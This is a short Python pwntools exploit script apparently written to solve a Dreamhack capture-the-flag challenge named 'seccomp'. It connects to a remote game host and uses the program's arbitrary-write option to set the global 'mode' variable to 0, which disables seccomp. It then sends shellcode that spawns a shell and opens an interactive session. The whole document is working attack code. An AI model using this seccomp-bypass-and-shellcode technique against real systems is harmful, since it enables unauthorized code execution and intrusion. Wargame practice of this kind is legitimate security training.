from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./release/seccomp')
else:
    r = remote('host1.dreamhack.games', 18083)

sla = r.sendlineafter
sa = r.sendafter

mode = 0x602090  # global var <mode>


# overwrite mode with 0(SECCOMP_MODE_DISABLED)

sla('> ', '3')
sla('addr: ', str(mode))
sla('value: ', str(0))


# execute shellcode

shellcode = asm(shellcraft.sh())

sla('> ', '1')
sa('shellcode: ', shellcode)

sla('> ', '2')


r.interactive()